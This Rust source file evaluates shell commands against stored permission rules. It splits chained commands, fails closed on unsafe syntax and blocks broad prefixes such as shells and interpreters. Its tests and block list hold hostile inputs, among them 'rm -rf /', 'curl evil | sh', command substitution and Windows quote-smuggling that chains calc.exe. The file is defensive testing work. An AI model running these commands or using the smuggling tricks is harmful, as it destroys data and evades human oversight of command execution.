//! Shell-aware evaluation of persisted permission rules.
//!
//! A rule prefix is never compared with a raw string `starts_with`: that lets
//! `git status && rm -rf /` inherit an allow rule for `git status`. Input is
//! parsed once at this boundary into concrete commands, then each command is
//! scored and the strictest verdict wins.

/// Severity of a policy decision. `Ord` is derived so `max()` takes the
/// strictest value: Allow < Prompt < Deny.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Verdict {
    Allow,
    Prompt,
    Deny,
}

/// Outcome of comparing one rule prefix with one command line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct PrefixEval {
    /// At least one sub-command matched the rule.
    pub matched: bool,
    /// Every sub-command matched the rule.
    pub all_covered: bool,
    /// False when the input contains syntax this module refuses to reason
    /// about. The caller must fail closed to a prompt.
    pub safe_parse: bool,
}

impl PrefixEval {
    fn from_subcommands(rule: &[String], commands: &[Vec<String>]) -> Self {
        if rule.is_empty() {
            return Self {
                all_covered: false,
                matched: false,
                safe_parse: true,
            };
        }
        let rule_exec = executable_key(&rule[0]);
        let mut all_covered = true;
        let mut matched = false;
        for cmd in commands {
            if prefix_matches_with_exec(rule, &rule_exec, cmd) {
                matched = true;
            } else {
                all_covered = false;
            }
        }
        Self {
            all_covered,
            matched,
            safe_parse: true,
        }
    }
}

/// Shell assignment word: `NAME=value` where NAME is a valid identifier.
/// A shell applies these before running the real executable, so a rule cannot
/// score the command that follows.
fn is_assignment_word(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// POSIX shell reserved keywords that alter command grammar in `argv[0]`.
fn is_reserved_shell_keyword(token: &str) -> bool {
    matches!(
        token,
        "!" | "if"
            | "then"
            | "elif"
            | "else"
            | "fi"
            | "for"
            | "while"
            | "until"
            | "do"
            | "done"
            | "case"
            | "esac"
            | "in"
            | "time"
            | "coproc"
            | "function"
            | "select"
    )
}

/// Push a completed token, refusing assignment words, globs, or reserved shell
/// keywords in executable position.
fn push_token(current: &mut Vec<String>, token: &mut String) -> bool {
    if current.is_empty()
        && (is_assignment_word(token)
            || is_reserved_shell_keyword(token)
            || token.contains(['*', '?', '[', ']']))
    {
        return false;
    }
    current.push(std::mem::take(token));
    true
}

/// Tokenize a shell command line into concrete sub-commands.
///
/// Returns `None` for constructs that cannot be scored safely: command or
/// parameter expansion, backticks, redirection, assignment words in executable
/// position, unterminated quotes, comments, or ambiguous escapes. Shell `&&`,
/// `||`, `;`, `|`, `&` and newlines split sub-commands.
fn split_commands(input: &str) -> Option<Vec<Vec<String>>> {
    let mut commands: Vec<Vec<String>> = Vec::new();
    let mut current: Vec<String> = Vec::new();
    let mut token = String::new();
    let mut has_token = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => {
                if cfg!(windows) && matches!(ch, '\u{2018}'..='\u{201E}') {
                    // PowerShell treats Unicode curly quotes as string delimiters.
                    return None;
                }
                if ch == q {
                    if cfg!(windows) {
                        if chars.peek() == Some(&q) {
                            // PowerShell escapes `""` / `''` inside quoted strings.
                            return None;
                        }
                        if let Some(&next) = chars.peek() {
                            if !next.is_whitespace()
                                && !matches!(next, ';' | '&' | '|' | '\n' | '\r')
                            {
                                // Fail closed when non-separator text immediately follows a
                                // closing quote (e.g. `'a'b`), which differs between shells.
                                return None;
                            }
                        }
                    }
                    quote = None;
                } else if ch == '\\' && q == '"' {
                    if cfg!(windows) {
                        // In PowerShell double quotes, `\` is literal, NOT an escape.
                        // Fail closed on `\"` to prevent parser differential with PowerShell.
                        if chars.peek() == Some(&'"') {
                            return None;
                        }
                        token.push('\\');
                    } else {
                        let next = chars.next()?;
                        if next == '\n' || next == '\r' {
                            // Fail closed on POSIX `\<newline>` line continuation.
                            return None;
                        }
                        token.push(next);
                    }
                } else if q == '"' && (ch == '$' || ch == '`') {
                    // The shell still expands these inside double quotes, so
                    // the command cannot be scored as literal text.
                    return None;
                } else {
                    token.push(ch);
                }
                has_token = true;
            }
            None => match ch {
                '#' => return None,
                '\'' | '"' => {
                    if cfg!(windows) && has_token {
                        // In PowerShell argument mode, a mid-token quote like `a'b; calc.exe`
                        // is literal rather than a quote opener, so `;` still splits commands.
                        return None;
                    }
                    quote = Some(ch);
                    has_token = true;
                }
                c if cfg!(windows)
                    && matches!(c, '\u{2018}'..='\u{201E}' | '\u{2013}'..='\u{2015}') =>
                {
                    return None;
                }
                '\\' => {
                    if cfg!(windows) {
                        // On Windows/PowerShell, `\` is a literal path separator, never an escape.
                        token.push('\\');
                    } else {
                        let next = chars.next()?;
                        if next == '\n' || next == '\r' {
                            // Fail closed on POSIX `\<newline>` line continuation.
                            return None;
                        }
                        token.push(next);
                    }
                    has_token = true;
                }
                '$' => return None,
                // PowerShell evaluates bare `(...)` and `@(...)` as expressions.
                // POSIX groups `{ ...; }` and expands `~`.
                '(' | ')' | '{' | '}' | '~' => return None,
                '`' | '>' | '<' => return None,
                ';' | '&' | '|' | '\n' | '\r' => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                    if !current.is_empty() {
                        commands.push(std::mem::take(&mut current));
                    }
                }
                c if c.is_whitespace() => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                }
                c => {
                    token.push(c);
                    has_token = true;
                }
            },
        }
    }

    if quote.is_some() {
        return None;
    }
    if has_token && !push_token(&mut current, &mut token) {
        return None;
    }
    if !current.is_empty() {
        commands.push(current);
    }
    if commands.is_empty() {
        None
    } else {
        Some(commands)
    }
}

fn executable_key_cow(name: &str) -> std::borrow::Cow<'_, str> {
    let basename = name.rsplit(['/', '\\']).next().unwrap_or(name);
    let stem = if basename.len() >= 4
        && [".exe", ".cmd", ".bat", ".com"].iter().any(|ext| {
            basename.as_bytes()[basename.len() - 4..].eq_ignore_ascii_case(ext.as_bytes())
        }) {
        &basename[..basename.len() - 4]
    } else {
        basename
    };
    if stem
        .bytes()
        .all(|b| b.is_ascii() && !b.is_ascii_uppercase())
    {
        std::borrow::Cow::Borrowed(stem)
    } else {
        std::borrow::Cow::Owned(stem.to_lowercase())
    }
}

/// Windows-compatible executable key: ASCII-lowercased, extension stripped,
/// Unicode-lowercased. Path components are dropped so `/usr/bin/git` and
/// `C:\tools\git.exe` both key to `git`.
pub fn executable_key(name: &str) -> String {
    executable_key_cow(name).into_owned()
}

fn token_eq(a: &str, b: &str) -> bool {
    // On Windows every token is case-insensitive (`/K` vs `/k`). On POSIX
    // flags are case-sensitive too: `-x` and `-X` are different options.
    // Absolute paths such as `/tmp/Foo` stay case-sensitive on POSIX.
    if cfg!(windows) {
        a.eq_ignore_ascii_case(b)
    } else {
        a == b
    }
}

fn prefix_matches_with_exec(rule: &[String], rule_exec: &str, command: &[String]) -> bool {
    if rule.is_empty() || command.is_empty() || rule.len() > command.len() {
        return false;
    }
    if rule_exec != executable_key_cow(&command[0]).as_ref() {
        return false;
    }
    rule[1..]
        .iter()
        .zip(&command[1..])
        .all(|(a, b)| token_eq(a, b))
}

fn push_best_effort_token(current: &mut Vec<String>, token: &mut String) {
    let tok = std::mem::take(token);
    if current.is_empty() && (is_assignment_word(&tok) || is_reserved_shell_keyword(&tok)) {
        return;
    }
    current.push(tok);
}

/// Best-effort segmentation when `split_commands` refuses unsafe syntax:
/// extracts leading executable/argument tokens per top-level segment while
/// ignoring leading `NAME=val` assignments and reserved shell keywords.
fn best_effort_segments(input: &str) -> Vec<Vec<String>> {
    let mut segments: Vec<Vec<String>> = Vec::new();
    let mut current: Vec<String> = Vec::new();
    let mut token = String::new();
    let mut has_token = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => {
                if ch == q {
                    quote = None;
                } else if ch == '\\' && q == '"' {
                    if cfg!(windows) {
                        token.push('\\');
                    } else if let Some(next) = chars.next() {
                        if next != '\n' && next != '\r' {
                            token.push(next);
                        }
                    }
                } else {
                    token.push(ch);
                }
                has_token = true;
            }
            None => match ch {
                '#' => {
                    if has_token {
                        push_best_effort_token(&mut current, &mut token);
                        has_token = false;
                    }
                    if !current.is_empty() {
                        segments.push(std::mem::take(&mut current));
                    }
                    for c in chars.by_ref() {
                        if c == '\n' || c == '\r' {
                            break;
                        }
                    }
                }
                '\'' | '"' => {
                    quote = Some(ch);
                    has_token = true;
                }
                '\\' => {
                    if cfg!(windows) {
                        token.push('\\');
                    } else if let Some(next) = chars.next() {
                        if next != '\n' && next != '\r' {
                            token.push(next);
                        }
                    }
                    has_token = true;
                }
                ';' | '&' | '|' | '\n' | '\r' | '(' | ')' | '{' | '}' | '`' | '<' | '>' => {
                    if has_token {
                        push_best_effort_token(&mut current, &mut token);
                        has_token = false;
                    }
                    if !current.is_empty() {
                        segments.push(std::mem::take(&mut current));
                    }
                }
                c if c.is_whitespace() => {
                    if has_token {
                        push_best_effort_token(&mut current, &mut token);
                        has_token = false;
                    }
                }
                c => {
                    token.push(c);
                    has_token = true;
                }
            },
        }
    }

    if has_token {
        push_best_effort_token(&mut current, &mut token);
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

/// Pre-parsed shell command reused across multiple prefix rule checks.
#[derive(Debug, Clone)]
pub struct ParsedCommand {
    subcommands: Option<Vec<Vec<String>>>,
    fallback_segments: Vec<Vec<String>>,
}

impl ParsedCommand {
    /// Parse a command line once for repeated [`Self::check_prefix`] evaluations.
    pub fn parse(command: &str) -> Self {
        match split_commands(command) {
            Some(c) => Self {
                subcommands: Some(c),
                fallback_segments: Vec::new(),
            },
            None => Self {
                subcommands: None,
                fallback_segments: best_effort_segments(command),
            },
        }
    }

    /// Returns true when the command parsed cleanly without unsafe shell constructs.
    pub fn is_safe_parse(&self) -> bool {
        self.subcommands.is_some()
    }

    /// Compare a persisted `arg_prefix` with this pre-parsed command.
    pub fn check_prefix(&self, rule_prefix: &str) -> PrefixEval {
        let rule = match split_commands(rule_prefix) {
            Some(mut c) if c.len() == 1 => c.remove(0),
            _ => {
                return PrefixEval {
                    matched: false,
                    all_covered: false,
                    safe_parse: false,
                };
            }
        };
        match &self.subcommands {
            Some(commands) => PrefixEval::from_subcommands(&rule, commands),
            None => {
                let matched = if rule.is_empty() {
                    false
                } else {
                    let rule_exec = executable_key_cow(&rule[0]);
                    self.fallback_segments
                        .iter()
                        .any(|seg| prefix_matches_with_exec(&rule, &rule_exec, seg))
                };
                PrefixEval {
                    matched,
                    all_covered: false,
                    safe_parse: false,
                }
            }
        }
    }
}

/// Compare a persisted `arg_prefix` with a command line.
pub fn check_prefix(rule_prefix: &str, command: &str) -> PrefixEval {
    ParsedCommand::parse(command).check_prefix(rule_prefix)
}

/// Turn a verdict from a rule into the verdict for the whole command line.
pub fn verdict_for(eval: PrefixEval, action_allows: bool) -> Verdict {
    if !eval.safe_parse {
        return Verdict::Prompt;
    }
    if action_allows {
        if eval.all_covered {
            Verdict::Allow
        } else {
            Verdict::Prompt
        }
    } else if eval.matched {
        Verdict::Deny
    } else {
        Verdict::Allow
    }
}

fn is_versioned_key(key: &str, base: &str) -> bool {
    key.strip_prefix(base)
        .is_some_and(|rest| rest.is_empty() || rest.chars().all(|c| c.is_ascii_digit() || c == '.'))
}

fn is_dangerous_argv(argv: &[String]) -> bool {
    if argv.len() < 2 {
        return true;
    }
    let key = executable_key_cow(&argv[0]);
    let is_versioned_interpreter = ["python", "ruby", "perl", "php", "node", "pwsh"]
        .iter()
        .any(|base| is_versioned_key(&key, base));
    if is_versioned_interpreter
        || matches!(
            key.as_ref(),
            "bash"
                | "sh"
                | "zsh"
                | "dash"
                | "fish"
                | "ksh"
                | "csh"
                | "tcsh"
                | "ash"
                | "busybox"
                | "cmd"
                | "powershell"
                | "wsl"
                | "py"
                | "pythonw"
                | "iex"
                | "invoke-expression"
                | "invoke-command"
                | "icm"
                | "start-process"
                | "saps"
                | "start"
                | "cscript"
                | "wscript"
                | "deno"
                | "bun"
                | "awk"
                | "gawk"
                | "sed"
                | "find"
                | "xargs"
                | "eval"
                | "exec"
                | "."
                | "source"
                | "sudo"
                | "su"
                | "doas"
                | "runas"
                | "command"
                | "nohup"
                | "timeout"
                | "nice"
                | "env"
                | "ssh"
                | "docker"
                | "podman"
                | "kubectl"
                | "tar"
                | "npx"
                | "npm"
                | "pnpm"
                | "yarn"
                | "uv"
                | "pip"
                | "cargo"
                | "go"
                | "make"
                | "just"
        )
    {
        return true;
    }
    let second = &argv[1];
    ["-c", "/c", "/k", "-ec", "-e", "-f", "--exec", "run", "-en"]
        .iter()
        .any(|flag| second.eq_ignore_ascii_case(flag))
        || second
            .get(..2)
            .is_some_and(|p| p.eq_ignore_ascii_case("-c"))
        || second
            .get(..6)
            .is_some_and(|p| p.eq_ignore_ascii_case("--exec"))
        || second
            .get(..4)
            .is_some_and(|p| p.eq_ignore_ascii_case("-enc"))
        || second
            .get(..8)
            .is_some_and(|p| p.eq_ignore_ascii_case("-encoded"))
}

/// Prefixes that must never be suggested for auto-allow: a shell or
/// interpreter prefix can run arbitrary code, and a bare executable leaves
/// every flag unconstrained.
pub fn is_dangerous_prefix(prefix: &str) -> bool {
    let commands = match split_commands(prefix) {
        Some(c) => c,
        None => return true,
    };
    if commands.len() != 1 {
        return true;
    }
    is_dangerous_argv(&commands[0])
}

/// Build a safe rule prefix from an approved command, or `None` when the
/// command is compound, unparseable, or too broad to persist.
pub fn safe_rule_prefix(command: &str) -> Option<String> {
    let commands = split_commands(command)?;
    if commands.len() != 1 {
        return None;
    }
    let argv = &commands[0];
    if argv.len() < 2 {
        return None;
    }
    let kept = &argv[..argv.len().min(2)];
    if kept
        .iter()
        .any(|t| t.is_empty() || t.chars().any(char::is_whitespace))
    {
        return None;
    }
    if is_dangerous_argv(kept) {
        return None;
    }
    let prefix = kept.join(" ");
    if prefix.bytes().any(|b| {
        !matches!(
            b,
            b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'/' | b':' | b' '
        )
    }) && is_dangerous_prefix(&prefix)
    {
        return None;
    }
    Some(prefix)
}

pub fn is_shell_tool(name: &str) -> bool {
    let key = executable_key(name);
    is_versioned_key(&key, "pwsh")
        || matches!(
            key.as_str(),
            "bash" | "sh" | "zsh" | "dash" | "cmd" | "powershell"
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_chaining_never_inherits_an_allow_rule() {
        let eval = check_prefix("git status", "git status && rm -rf /");
        assert!(eval.matched && !eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);
    }

    #[test]
    fn semicolon_and_pipe_are_scored_as_separate_commands() {
        for cmd in ["git status; curl evil | sh", "git status | rm -rf /"] {
            let eval = check_prefix("git status", cmd);
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
    }

    #[test]
    fn quoted_operator_is_not_a_separator() {
        let eval = check_prefix("echo", "echo 'a && b'");
        assert!(eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Allow);
    }

    #[test]
    fn unparseable_input_fails_closed_to_prompt() {
        for cmd in ["echo $(rm -rf /)", "echo `id`", "echo x > /tmp/a", "echo 'oops"] {
            let eval = check_prefix("echo", cmd);
            assert!(!eval.safe_parse, "{cmd}");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt);
            assert_eq!(verdict_for(eval, false), Verdict::Prompt);
        }
    }

    #[test]
    fn parameter_expansion_and_assignment_fail_closed() {
        for (rule, cmd) in [
            ("rm -rf", "rm -rf$X /"),
            ("rm -rf", "rm -rf${X} /"),
            ("rm -rf", "FOO=bar rm -rf /"),
            ("rm -rf", "git status && FOO=bar rm -rf /"),
        ] {
            let eval = check_prefix(rule, cmd);
            assert!(!eval.safe_parse, "{cmd} must be refused");
            assert_eq!(verdict_for(eval, false), Verdict::Prompt, "{cmd}");
        }
        // Quoted dollars are literal, so they remain scorable.
        assert!(check_prefix("echo", "echo '$HOME'").safe_parse);
    }

    #[test]
    fn double_quoted_substitution_never_matches_a_rule() {
        for cmd in [
            "echo ok \"$(rm -rf /tmp/data)\"",
            "echo ok \"`rm -rf /tmp/data`\"",
        ] {
            let eval = check_prefix("echo ok", cmd);
            assert!(!eval.safe_parse, "{cmd} must refuse shell substitution");
            assert!(!eval.all_covered, "{cmd} must not be covered by a rule");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
        // On POSIX, an escaped dollar inside double quotes is literal and stays scorable.
        // On Windows PowerShell, `\` does not escape `$`, so `\$HOME` still expands.
        assert_eq!(
            check_prefix("echo", "echo \"\\$HOME\"").safe_parse,
            !cfg!(windows)
        );
    }

    #[test]
    fn windows_extension_and_case_do_not_bypass_a_rule() {
        // Executable case/extension normalization applies on every platform.
        // Flag case is insensitive only on Windows; POSIX keeps it identical.
        let (rule, cmd) = if cfg!(windows) {
            ("CMD.EXE /k", "cmd.exe /K whoami")
        } else {
            ("CMD.EXE -k", "cmd.exe -k whoami")
        };
        let eval = check_prefix(rule, cmd);
        assert!(eval.all_covered, "case/extension must be normalized");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[cfg(not(windows))]
    #[test]
    fn posix_flag_case_is_significant() {
        let eval = check_prefix("curl -x", "curl -X DELETE url");
        assert!(eval.safe_parse);
        assert!(!eval.all_covered, "-X must not match -x on POSIX");
        assert_eq!(verdict_for(eval, false), Verdict::Allow);

        let eval = check_prefix("curl -x", "curl -x proxy");
        assert!(eval.all_covered, "exact flag case must still match on POSIX");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[cfg(windows)]
    #[test]
    fn windows_flag_case_is_insignificant() {
        let eval = check_prefix("curl -x", "curl -X DELETE url");
        assert!(eval.all_covered, "flags are case-insensitive on Windows");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_does_not_bypass_a_basename_deny_rule() {
        let eval = check_prefix("git push", "/usr/bin/git push --force origin main");
        assert!(eval.all_covered);
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_argument_case_sensitivity_follows_platform() {
        let eval = check_prefix("cat /tmp/Secret", "cat /tmp/secret");
        assert!(eval.safe_parse);
        assert_eq!(
            eval.all_covered,
            cfg!(windows),
            "POSIX path arguments are case-sensitive; Windows tokens are not"
        );
    }

    #[test]
    fn dangerous_prefixes_are_never_persisted() {
        for cmd in [
            "git",
            "git -c core.sshCommand=evil push",
            "bash -c 'rm -rf /'",
            "cmd.exe /k calc",
            "pwsh -ec aWQ=",
            "python -c pass",
            "node -e 1",
            "find /tmp -exec rm {} +",
            "git status && rm -rf /",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
    }

    #[test]
    fn safe_prefix_is_kept() {
        assert_eq!(safe_rule_prefix("git status --short"), Some("git status".into()));
        assert_eq!(safe_rule_prefix("ls -la"), Some("ls -la".into()));
    }

    #[cfg(windows)]
    #[test]
    fn windows_backslash_never_escapes_command_separator() {
        let eval = check_prefix("git status", r"git status C:\; calc.exe");
        assert!(!eval.all_covered, "semicolon after backslash must split subcommands on Windows");
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);

        let quoted = check_prefix("git status", r#"git status "foo\"; calc.exe; echo \""#);
        assert!(!quoted.safe_parse, "ambiguous quote+backslash must fail closed on Windows");
        assert_eq!(verdict_for(quoted, true), Verdict::Prompt);

        let trailing = check_prefix("dir", r"dir C:\");
        assert!(trailing.safe_parse && trailing.all_covered);
        assert_eq!(verdict_for(trailing, true), Verdict::Allow);
    }

    #[test]
    fn versioned_interpreters_and_exec_tools_are_dangerous_prefixes() {
        for cmd in [
            "python3.12 script.py",
            "ruby3.3 app.rb",
            "awk -f prog.awk",
            "awk 'BEGIN{system(\"id\")}'",
            "sed 's/a/b/e' file",
            "ssh user@host id",
            "docker run alpine id",
            "deno run main.ts",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
    }

    #[test]
    fn hash_comment_with_quote_and_newline_fails_closed() {
        let cmd = "git status #'\nrm -rf /\n#'";
        let eval = check_prefix("git status", cmd);
        assert!(!eval.safe_parse, "unquoted # comment must fail closed");
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);
    }

    #[cfg(windows)]
    #[test]
    fn windows_doubled_quotes_and_unicode_quotes_fail_closed() {
        for cmd in [
            r#"git status "a"""; calc.exe #""#,
            r#"git status 'a'''; calc.exe #'"#,
            "git status \"a\u{201D}; calc.exe #\"",
            "git status \u{2018}a\u{2019}; calc.exe",
            "git status \u{2013}short",
        ] {
            let eval = check_prefix("git status", cmd);
            assert!(!eval.safe_parse, "{cmd} must fail closed on Windows");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
    }

    #[cfg(not(windows))]
    #[test]
    fn posix_line_continuation_keywords_and_globs_fail_closed() {
        for cmd in [
            "rm -r\\\nf /",
            "r\\\nm -rf /",
            "! rm -rf /",
            "{ rm -rf /; }",
            "if true; then rm -rf /; fi",
            "/bin/[r]m -rf /",
            "echo \"a\\\nb\"",
        ] {
            let eval = check_prefix("rm -rf", cmd);
            assert!(!eval.safe_parse, "{cmd} must fail closed on POSIX");
        }
    }

    #[test]
    fn unmatched_allow_rule_never_allows() {
        let eval = check_prefix("git status", "rm -rf /");
        assert!(eval.safe_parse);
        assert!(!eval.matched);
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);
    }

    #[test]
    fn dangerous_wrappers_attached_flags_and_whitespace_tokens_rejected() {
        for cmd in [
            "git -ccore.sshCommand=evil push",
            "git --exec-path=/tmp/evil status",
            "pwsh -en aWQ=",
            "pwsh -enc aWQ=",
            "su -c id",
            "doas id",
            "runas /user:admin cmd",
            "fish -c id",
            "ksh -c id",
            "wsl id",
            "py -c pass",
            "iex something",
            "start-process calc",
            "cscript foo.vbs",
            "wscript foo.vbs",
            "nohup id",
            "timeout 10 id",
            "nice id",
            "podman run alpine id",
            "pnpm exec id",
            "yarn dlx evil",
            "uv run script.py",
            "pip install .",
            "go run .",
            "just build",
            "git \"sub cmd\" arg",
            "start calc",
            "invoke-command script",
            "icm script",
            ". ./evil.sh",
            "source ./evil.sh",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
        assert!(is_shell_tool("pwsh7"));
    }

    #[cfg(windows)]
    #[test]
    fn windows_mid_token_and_trailing_quotes_fail_closed() {
        for cmd in [
            "git status a'b; calc.exe; echo c'd",
            r#"git status a"b; calc.exe; echo c"d"#,
            "git status 'a'b; calc.exe",
            r#"git status "a"b"#,
        ] {
            let eval = check_prefix("git status", cmd);
            assert!(!eval.safe_parse, "{cmd} must fail closed on Windows");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
    }

    #[test]
    fn unparseable_command_best_effort_matches_leading_tokens_and_ignores_assignments() {
        let rm_sub = check_prefix("rm -rf", "rm -rf $(echo /)");
        assert!(!rm_sub.safe_parse);
        assert!(!rm_sub.all_covered);
        assert!(rm_sub.matched, "rm -rf $(echo /) must match rm -rf");

        let unrelated = check_prefix("git push --force", "cargo test 2>&1");
        assert!(!unrelated.safe_parse);
        assert!(!unrelated.all_covered);
        assert!(
            !unrelated.matched,
            "cargo test 2>&1 must NOT match git push --force"
        );

        let assign_rm = check_prefix("rm -rf", "FOO=bar rm -rf /");
        assert!(!assign_rm.safe_parse);
        assert!(
            assign_rm.matched,
            "leading assignment must be ignored so FOO=bar rm -rf / matches rm -rf"
        );

        let chained_assign = check_prefix("rm -rf", "git status && FOO=bar BAZ=1 rm -rf /");
        assert!(!chained_assign.safe_parse);
        assert!(chained_assign.matched);

        let assign_unrelated = check_prefix("git push --force", "FOO=bar cargo test 2>&1");
        assert!(!assign_unrelated.safe_parse);
        assert!(!assign_unrelated.matched);
    }

    #[test]
    fn unparseable_rule_prefix_never_matches() {
        let eval = check_prefix("echo $(id)", "echo $(id)");
        assert_eq!(
            eval,
            PrefixEval {
                matched: false,
                all_covered: false,
                safe_parse: false,
            }
        );

        let compound_rule = check_prefix("git status && rm -rf /", "git status");
        assert_eq!(
            compound_rule,
            PrefixEval {
                matched: false,
                all_covered: false,
                safe_parse: false,
            }
        );
    }
}
